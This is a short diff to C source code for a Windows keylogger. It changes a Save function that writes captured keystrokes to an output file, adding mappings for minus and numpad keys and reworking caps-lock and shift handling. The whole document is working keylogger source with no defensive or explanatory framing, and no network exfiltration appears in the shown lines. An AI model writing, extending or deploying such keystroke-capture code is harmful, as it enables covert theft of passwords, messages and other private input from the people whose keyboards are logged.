@@ -118,20 +118,26 @@ int Save(int key_stroke, char *file)
 		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
 	else if (key_stroke == 190 || key_stroke == 110)
 		fprintf(OUTPUT_FILE, "%s", ".");
+	else if (key_stroke == 189 || key_stroke == 109)
+		fprintf(OUTPUT_FILE, "%s", "-");
 	else if (key_stroke == 20)
-	     fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
+		fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
 	else {
-         if(key_stroke>=65 && key_stroke<=90) { // A-Z
-             // check caps lock
-             bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001)!=0);
-             
-             // check shift key
-             if((GetKeyState(VK_SHIFT) & 0x0001)!=0 || (GetKeyState(VK_LSHIFT) & 0x0001)!=0 || (GetKeyState(VK_RSHIFT) & 0x0001)!=0) {
-                  lowercase = !lowercase;                     
-             }
-             
-             if (lowercase) key_stroke += 32;
-         }
+		if (key_stroke >= 96 && key_stroke <= 105)
+		{
+			key_stroke -= 48;
+			}
+		else if (key_stroke >= 65 && key_stroke <= 90) { // A-Z
+													// check caps lock
+			bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
+
+			// check shift key
+			if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 || (GetKeyState(VK_LSHIFT) & 0x0001) != 0 || (GetKeyState(VK_RSHIFT) & 0x0001) != 0) {
+				lowercase = !lowercase;
+			}
+
+			if (lowercase) key_stroke += 32;
+		}
 		fprintf(OUTPUT_FILE, "%c", key_stroke);
     }
 	// NOTE: Numpad-Keys seem to print as lowercase letters
